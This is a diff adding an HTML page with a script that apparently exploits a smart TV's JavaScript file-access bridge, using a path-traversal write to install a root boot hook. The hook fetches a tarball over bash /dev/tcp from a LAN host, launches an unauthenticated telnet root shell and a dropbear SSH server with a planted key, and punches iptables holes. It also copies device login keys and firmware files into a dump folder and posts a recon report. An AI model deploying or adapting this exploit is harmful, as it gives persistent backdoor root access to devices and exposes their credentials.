@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>hookinstall</title>
+<style>
+  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
+  #out { font: 19px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
+         word-break: break-all; padding: 10px; }
+  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; }
+</style>
+</head>
+<body>
+<div id="out">hookinstall…</div>
+<script>
+(function () {
+  "use strict";
+  // Installs root-hook v10 to /var/local/otaTest.sh (runs as root at boot):
+  // fetches tvtools.tar.gz (busybox + static dropbear) from the Pi over
+  // bash /dev/tcp, starts telnetd on 2323 and dropbear on 2222 (keys only,
+  // authorized_keys on rw /var/local/roothome via dropbear -D).
+  // Backs up the existing hook first. Fast: two bridge calls + POST.
+
+  var el = document.getElementById("out");
+  var rep = { started: new Date().toISOString(), backup: {}, write: {} };
+
+  function normMsg(m) {
+    if (m == null) return "";
+    if (typeof m === "string") return m;
+    try { return JSON.stringify(m); } catch (e) { return String(m); }
+  }
+  function hiCall(action, params) {
+    try {
+      var r = HiUtils_createRequest(action, params);
+      return r && typeof r === "object" ? { ret: r.ret, msg: normMsg(r.msg) } : { value: String(r) };
+    } catch (e) { return { exception: String(e) }; }
+  }
+  function isOk(ret) {
+    if (ret === true) return true;
+    if (typeof ret === "number") return ret !== 0;
+    if (typeof ret === "string") return ret !== "" && ret !== "0";
+    return false;
+  }
+  function line(t, c) {
+    var d = document.createElement("div");
+    d.textContent = t;
+    if (c) d.className = c;
+    el.appendChild(d);
+  }
+
+  var HOOK_PATH = "../var/local/otaTest.sh";
+
+  var HOOK_V10 = [
+    "#!/bin/sh",
+    "# alvidaa root hook v10 — installed " + rep.started,
+    "# remove: rm -rf /var/local/otaTest.sh /var/local/tvtools /var/local/roothome",
+    "exec > /var/local/otaTest.log 2>&1",
+    "chmod 644 /var/local/otaTest.log",
+    "date",
+    "if [ 1 = 1 ]; then",
+    "  n=0",
+    "  while [ $n -lt 30 ]; do",
+    "    ifconfig 2>/dev/null | grep -q 'inet addr' && break",
+    "    sleep 2; n=$((n+1))",
+    "  done",
+    "  date; echo network wait: $n",
+    "  ok=0",
+    "  for i in 1 2 3 4 5; do",
+    "    exec 3<>/dev/tcp/192.168.0.85/4444 && ok=1 && break",
+    "    sleep 5",
+    "  done",
+    "  if [ $ok = 1 ]; then",
+    "    cat <&3 > /var/local/tvtools.tar.gz",
+    "    exec 3<&-",
+    "    sync",
+    "    mkdir -p /var/local/tvtools",
+    "    tar xzf /var/local/tvtools.tar.gz -C /var/local/tvtools && echo UNTAR-OK",
+    "    chmod 755 /var/local/tvtools/busybox /var/local/tvtools/dropbear /var/local/tvtools/dropbearkey",
+    "  else",
+    "    echo FETCH-FAILED",
+    "  fi",
+    "else",
+    "  echo tvtools already present — skipping fetch",
+    "fi",
+    "/var/local/tvtools/busybox echo busybox-ok",
+    "mkdir -p /var/local/roothome/.ssh",
+    "echo '" + "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAKLC19p1Uj2t18xmrhWoryFKCEe4X/fjB+hU3sNNcmj alvidaa-tv-root" + "' > /var/local/roothome/authorized_keys",
+    "cp /var/local/roothome/authorized_keys /var/local/roothome/.ssh/authorized_keys",
+    "chown root:root /var/local/roothome/authorized_keys /var/local/roothome/.ssh/authorized_keys",
+    "chmod 600 /var/local/roothome/authorized_keys /var/local/roothome/.ssh/authorized_keys",
+    "chmod 755 /var/local/roothome; chmod 700 /var/local/roothome/.ssh",
+    "[ -f /var/local/tvtools/host_ed25519 ] || /var/local/tvtools/dropbearkey -t ed25519 -f /var/local/tvtools/host_ed25519",
+    "iptables -I INPUT 1 -p tcp --dport 2222 -j ACCEPT 2>/dev/null",
+    "iptables -I INPUT 1 -p tcp --dport 2323 -j ACCEPT 2>/dev/null",
+    "(i=0; while [ $i -lt 12 ]; do sleep 15; iptables -I INPUT 1 -p tcp --dport 2222 -j ACCEPT 2>/dev/null; iptables -I INPUT 1 -p tcp --dport 2323 -j ACCEPT 2>/dev/null; i=$((i+1)); done) &",
+    "echo '--- authorized_keys on disk ---'",
+    "cat /var/local/roothome/authorized_keys",
+    "md5sum /var/local/tvtools/dropbear /var/local/roothome/authorized_keys",
+    "/var/local/tvtools/busybox telnetd -p 2323 -l /bin/sh && echo TELNETD-OK-2323",
+    "kill -9 $(pidof dropbear) 2>/dev/null",
+    "/var/local/tvtools/dropbear -F -E -p 2222 -r /var/local/tvtools/host_ed25519 -D /var/local/roothome -s > /var/local/dropbear.log 2>&1 &",
+    "sleep 1; chmod 644 /var/local/dropbear.log; pgrep -f dropbear > /dev/null && echo DROPBEAR-OK-2222",
+    "(i=0; while [ $i -lt 40 ]; do sleep 30; pgrep -f 'dropbear -F' > /dev/null || { kill -9 $(pidof dropbear) 2>/dev/null; /var/local/tvtools/dropbear -F -E -p 2222 -r /var/local/tvtools/host_ed25519 -D /var/local/roothome -s >> /var/local/dropbear.log 2>&1 & chmod 644 /var/local/dropbear.log; }; pidof telnetd > /dev/null || /var/local/tvtools/busybox telnetd -p 2323 -l /bin/sh; i=$((i+1)); done) &",
+    "D=/var/local/rootdumps; mkdir -p $D; chmod 755 $D; chmod 644 $D/* 2>/dev/null",
+    "ps",
+    "iptables -L -n 2>&1 | head -60",
+    "cp /etc/0001-cli-login-aes.pem $D/ 2>/dev/null",
+    "cp /etc/0002-cli-login-sign-public.pem $D/ 2>/dev/null",
+    "cp /usr/local/bin/check_usb_key $D/ 2>/dev/null",
+    "chmod 644 $D/* 2>/dev/null",
+    "echo 'hook v10 done'"
+  ].join("\n") + "\n";
+
+  // 1. back up whatever hook is installed
+  var cur = hiCall("fileRead", { path: HOOK_PATH, mode: 6 });
+  if (isOk(cur.ret)) {
+    var b = hiCall("fileWrite", { path: "../var/local/otaTest.v1.bak", mode: 6,
+                                  writedata: cur.msg });
+    rep.backup = { backed_up: isOk(b.ret), bytes: cur.msg.length };
+    line("backup of previous hook: " + (isOk(b.ret) ? "ok" : "FAILED"), isOk(b.ret) ? "ok" : "err");
+  } else {
+    rep.backup = { backed_up: false, reason: String(cur.msg).slice(0, 100) };
+  }
+
+  // 2. install v2
+  var w = hiCall("fileWrite", { path: HOOK_PATH, mode: 6, writedata: HOOK_V10 });
+  rep.write = { ok: isOk(w.ret), result: String(w.msg).slice(0, 100) };
+  line("hook v2 write: " + (isOk(w.ret) ? "OK" : "FAILED " + String(w.msg).slice(0, 80)),
+    isOk(w.ret) ? "ok" : "err");
+
+  if (isOk(w.ret)) {
+    var rb = hiCall("fileRead", { path: HOOK_PATH, mode: 6 });
+    rep.write.readback_ok = isOk(rb.ret) && rb.msg.indexOf("v2") !== -1;
+    line("readback: " + rep.write.readback_ok, rep.write.readback_ok ? "ok" : "err");
+  }
+
+  line("== posting ==", "warn");
+  try {
+    var x = new XMLHttpRequest();
+    x.open("POST", "/api/recon", true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.send(JSON.stringify({ tag: "hookinstall", at: new Date().toISOString(), report: rep }));
+  } catch (e) { /* screen shows it */ }
+  line("== done — reboot the TV ==", "warn");
+})();
+</script>
+</body>
+</html>
